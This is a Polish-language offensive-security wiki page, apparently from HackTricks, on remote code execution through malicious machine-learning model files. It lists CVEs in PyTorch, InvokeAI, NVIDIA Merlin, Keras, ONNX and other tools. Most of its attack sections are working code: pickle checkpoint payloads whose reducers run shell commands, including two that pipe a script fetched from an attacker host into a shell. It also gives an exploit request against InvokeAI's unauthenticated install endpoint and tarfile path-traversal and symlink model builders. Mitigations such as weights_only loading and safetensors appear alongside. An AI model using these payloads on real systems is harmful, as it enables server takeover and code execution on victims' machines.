# Modele RCE

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli do RCE

Modele uczenia maszynowego są zwykle udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch, itp. Modele te mogą być ładowane na maszyny deweloperów lub do systemów produkcyjnych w celu użycia. Zazwyczaj modele nie powinny zawierać złośliwego kodu, ale zdarzają się przypadki, w których model może zostać użyty do wykonania dowolnego kodu na systemie jako zamierzona funkcja lub z powodu podatności w bibliotece ładującej modele.

W czasie pisania poniżej znajdują się przykłady tego rodzaju podatności:

| **Framework / Narzędzie**        | **Podatność (CVE jeśli dostępne)**                                                    | **Wektor RCE**                                                                                                                           | **Odnośniki**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Złośliwy pickle w checkpoint modelu prowadzi do wykonania kodu (ominięcie zabezpieczenia `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + pobranie złośliwego modelu powoduje wykonanie kodu; Java deserialization RCE w API zarządzania                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Niezaufany checkpoint uruchamia pickle reducer podczas `load_model_trainer_states_from_checkpoint` → wykonanie kodu w workerze ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Ładowanie modelu z YAML używa `yaml.unsafe_load` (wykonanie kodu) <br> Ładowanie modelu z warstwą **Lambda** uruchamia dowolny kod Pythona          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Sfałszowany model `.tflite` wywołuje przepełnienie całkowitoliczbowe → uszkodzenie sterty (potencjalne RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu przez `joblib.load` wykonuje pickle z payloadem `__reduce__` atakującego                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` domyślnie zezwala na obiekty pickle'owane – złośliwy `.npy/.npz` powoduje wykonanie kodu                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Ścieżka external-weights modelu ONNX może opuścić katalog (odczyt dowolnych plików) <br> Złośliwy tar modelu ONNX może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model z niestandardowym operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modelu mogą nadużywać logiki do wykonania niezamierzonych obliczeń   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Użycie model-load API z włączonym `--model-control` pozwala na względne przejście po ścieżkach w celu zapisu plików (np. nadpisanie `.bashrc` dla RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Sfałszowany plik modelu GGUF powoduje przepełnienia bufora sterty w parserze, umożliwiając wykonanie dowolnego kodu na systemie ofiary                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Złośliwy model HDF5 (`.h5`) z kodem w warstwie **Lambda** nadal wykonuje się podczas ładowania (Keras safe_mode nie obejmuje starego formatu – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Wiele narzędzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykona dowolny kod osadzony w plikach modeli, o ile nie zostanie złagodzone | |

Ponadto istnieją modele oparte na Python pickle, takie jak te używane przez [PyTorch](https://github.com/pytorch/pytorch/security), które mogą zostać użyte do wykonania dowolnego kodu na systemie, jeśli nie są ładowane z `weights_only=True`. Zatem każdy model oparty na pickle może być szczególnie podatny na tego typu ataki, nawet jeśli nie został wymieniony w powyższej tabeli.

### 🆕  InvokeAI RCE przez `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny open-sourceowy interfejs webowy dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają endpoint REST `/api/v2/models/install`, który pozwala użytkownikom pobierać i ładować modele z dowolnych URL-i.

Wewnątrz endpoint ostatecznie wywołuje:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Gdy dostarczony plik to **PyTorch checkpoint (`*.ckpt`)**, `torch.load` wykonuje **pickle deserialization**. Ponieważ zawartość pochodzi bezpośrednio z URL kontrolowanego przez użytkownika, atakujący może osadzić złośliwy obiekt z niestandardową metodą `__reduce__` wewnątrz checkpointa; metoda ta jest wykonywana **podczas deserializacji**, prowadząc do **remote code execution (RCE)** na serwerze InvokeAI.

Luka została przypisana **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Przebieg eksploatacji

1. Utwórz złośliwy checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Umieść `payload.ckpt` na serwerze HTTP, którym zarządzasz (np. `http://ATTACKER/payload.ckpt`).
3. Wywołaj podatny endpoint (nie wymaga uwierzytelnienia):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Gdy InvokeAI pobiera plik, wywołuje `torch.load()` → gadget `os.system` uruchamia się i atakujący uzyskuje wykonanie kodu w kontekście procesu InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.

#### Warunki

•  InvokeAI 5.3.1-5.4.2 (flaga scan domyślnie **false**)  
•  `/api/v2/models/install` dostępny dla atakującego  
•  Proces ma uprawnienia do wykonywania poleceń powłoki

#### Środki zaradcze

* Zaktualizuj do **InvokeAI ≥ 5.4.3** – poprawka ustawia `scan=True` domyślnie i wykonuje skanowanie w poszukiwaniu złośliwego oprogramowania przed deserializacją.  
* Podczas programowego ładowania checkpointów używaj `torch.load(file, weights_only=True)` lub nowego pomocnika [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Wymuś listy dozwolonych / podpisy dla źródeł modeli i uruchamiaj usługę zgodnie z zasadą najmniejszych uprawnień.

> ⚠️ Pamiętaj, że **każdy** format oparty na Python pickle (włączając wiele plików `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny do deserializacji z niezaufanych źródeł.

---

Przykład doraźnego środka zaradczego, jeśli musisz utrzymać starsze wersje InvokeAI działające za reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE przez niebezpieczne `torch.load` (CVE-2025-23298)

Transformers4Rec firmy NVIDIA (część Merlin) udostępnił niebezpieczny loader checkpointów, który bezpośrednio wywoływał `torch.load()` na ścieżkach podanych przez użytkownika. Ponieważ `torch.load` opiera się na Python `pickle`, checkpoint kontrolowany przez atakującego może wykonać dowolny kod za pomocą reducera podczas deserializacji.

Wrażliwa ścieżka (przed poprawką): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Dlaczego to prowadzi do RCE: W Python `pickle` obiekt może zdefiniować reducer (`__reduce__`/`__setstate__`), który zwraca callable i argumenty. Ten callable jest wykonywany podczas deserializacji (unpicklingu). Jeśli taki obiekt znajduje się w checkpoint, uruchomi się przed użyciem jakichkolwiek wag.

Minimalny złośliwy przykład checkpointu:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Wektory dostarczenia i promień rażenia:
- Trojanizowane checkpoints/models udostępniane przez repozytoria, buckety lub rejestry artefaktów
- Zautomatyzowane pipeline'y resume/deploy, które automatycznie ładują checkpoints
- Wykonanie ma miejsce wewnątrz workerów treningowych/inferencyjnych, często z podwyższonymi uprawnieniami (np. root w kontenerach)

Naprawa: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zastąpił bezpośrednie `torch.load()` ograniczonym, opartym na białej liście deserializatorem zaimplementowanym w `transformers4rec/utils/serialization.py`. Nowy loader waliduje typy/pola i zapobiega wywoływaniu dowolnych callable podczas ładowania.

Wytyczne obronne specyficzne dla checkpointów PyTorch:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- Jeśli musisz używać serializacji PyTorch, zapewnij `weights_only=True` (obsługiwane w nowszych wersjach PyTorch) lub użyj niestandardowego unpicklera opartego na białej liście podobnego do patcha w Transformers4Rec.
- Wymuszaj pochodzenie/podpisy modelu oraz deserializację w sandboxie (seccomp/AppArmor; użytkownik nie-root; ograniczony system plików i brak wychodzącego ruchu sieciowego).
- Monitoruj nieoczekiwane procesy potomne uruchamiane przez usługi ML podczas ładowania checkpointów; śledź użycie `torch.load()`/`pickle`.

POC i odniesienia do podatności/patchy:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Utwórz model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Załaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD udostępnia endpoint `resnet`, który deserializuje dane kontrolowane przez użytkownika. ZDI potwierdziło, że zdalny atakujący może zmusić ofiarę do załadowania złośliwej strony/pliku, skłonić ją do wysłania spreparowanego zserializowanego bloba do tego endpointu i wywołania deserializacji jako `root`, co prowadzi do pełnego przejęcia.

Przebieg exploitu odzwierciedla typowe nadużycie pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Każdy gadget dostępny podczas deserializacji (constructors, `__setstate__`, framework callbacks, etc.) można uzbroić w ten sam sposób, niezależnie od tego, czy transport był HTTP, WebSocket, czy plik wrzucony do obserwowanego katalogu.

## Modele umożliwiające Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne frameworki AI opiera się na archiwach, zwykle `.zip`. W związku z tym może być możliwe wykorzystanie tych formatów do przeprowadzenia ataków Path Traversal, pozwalających na odczyt dowolnych plików z systemu, na którym model jest załadowany.

Na przykład, za pomocą poniższego kodu możesz stworzyć model, który utworzy plik w katalogu `/tmp` podczas ładowania:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Lub, używając poniższego kodu, możesz stworzyć model, który utworzy symlink do katalogu `/tmp` po załadowaniu:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Dogłębna analiza: Keras .keras deserialization and gadget hunting

Aby uzyskać szczegółowy przewodnik po .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8 oraz post-fix gadget discovery inside the allowlist, zobacz:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referencje

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
